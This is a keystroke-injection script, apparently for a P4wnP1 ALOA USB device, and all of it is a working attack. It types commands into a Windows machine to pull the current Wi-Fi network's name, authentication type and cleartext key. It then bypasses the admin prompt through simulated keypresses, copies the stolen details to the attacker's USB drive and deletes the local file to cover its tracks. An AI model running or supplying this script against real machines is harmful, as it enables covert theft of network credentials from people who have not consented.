
layout("US"); //set US layout

typingSpeed(0,0);
press("GUI r")
delay(1000)
type("cmd")
delay(500)
press("ENTER")
delay(1000)

press("ENTER")
// --> Get SSID
type("for /f \"tokens=2 delims=: \" %A in (\'netsh wlan show interface ^| findstr \"SSID\" ^| findstr /v \"B\"') do set SSID=%A")
press("ENTER")
// --> Get network type
type("netsh wlan show profiles %SSID% | findstr \"Network type\" | findstr /v \"broadcast\" | findstr /v \"Radio\">Temp.txt")
press("ENTER")
type("for /f \"tokens=3 delims=: \" %A in (\'findstr \"Network type\" Temp.txt\') do set NETTYPE=%A")
press("ENTER")
// --> Get authentication
type("netsh wlan show profiles %SSID% | findstr \"Authentication\">Temp.txt")
press("ENTER")
type("for /f \"tokens=2 delims=: \" %A in (\'findstr \"Authentication\" Temp.txt\') do set AUTH=%A")
press("ENTER")
// --> Get key
type("netsh wlan show profiles %SSID% key=clear | findstr \"Key Content\">Temp.txt")
press("ENTER")
type("for /f \"tokens=3 delims=: \" %A in (\'findstr \"Key Content\" Temp.txt\') do set KEY=%A")
press("ENTER")
// --> Delete Temp.txt
type("del Temp.txt")
press("ENTER")
// --> Create Log.txt
type("echo SSID: %SSID%>>wirelesspassword.txt & echo Network type: %NETTYPE%>>wirelesspassword.txt & echo Authentication: %AUTH%>>wirelesspassword.txt & echo Password: %KEY%>>wirelesspassword.txt")
press("ENTER")
delay(1000)
type("exit")
press("ENTER")
delay(500)
press("GUI r")
press("ENTER")
delay(1200)
type("powershell")
delay(1000)
press("CTRL SHIFT ENTER")
delay(1200)
press("LEFT")
delay(750)
press("ENTER")
delay(750)
type("cd $home\n")
delay(500)
type("$usbpath = Get-WMIObject Win32_Volume | ? { $_.Label -eq \'P4wnP1 ALOA\' } | select name \n")
type("copy wirelesspassword.txt $usbpath.name\n")
type("del wirelesspassword.txt\n ; exit\n")
